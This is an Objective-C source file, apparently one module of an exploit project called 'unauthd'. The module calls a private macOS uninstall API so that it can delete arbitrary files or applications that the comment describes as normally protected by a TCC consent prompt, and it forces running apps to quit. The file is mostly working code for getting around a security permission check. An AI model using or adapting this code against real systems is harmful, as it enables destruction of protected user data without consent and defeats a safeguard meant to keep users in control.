//
//  uninstaller.m
//  unauthd
//
//  Created by Ilias Morad (A2nkF) on 2/7/20.
//  Copyright © 2020 Ilias Morad (A2nkF). All rights reserved.
//

#import <Foundation/Foundation.h>

#import "uninstaller.h"


/*!
 * -- Uninstaller module --
 *
 * Remove files/direcectories, that would usually be protected by a TCC prompt
 *
 * Example usage:
 *
 * [Uninstaller  _uninstallApp:@"/Applications/Install macOS Catalina.app"];
 */
@implementation Uninstaller

+ (void)_uninstallApp: (NSString *)location {
    NSURL *url = [NSURL fileURLWithPath:location];

    NSLog(@"[*] Attempting uninstall of %@", location);
    if([UNUninstallRequest uninstallablityOfFileAtURL:url] == 0x00) {
        UNUninstallRequest *request = [UNUninstallRequest requestUninstallOfBundleAtURL:url];
        [request shouldForceRunningApplicationsToQuit:true];
        [request queueRequest];
    }
}

@end
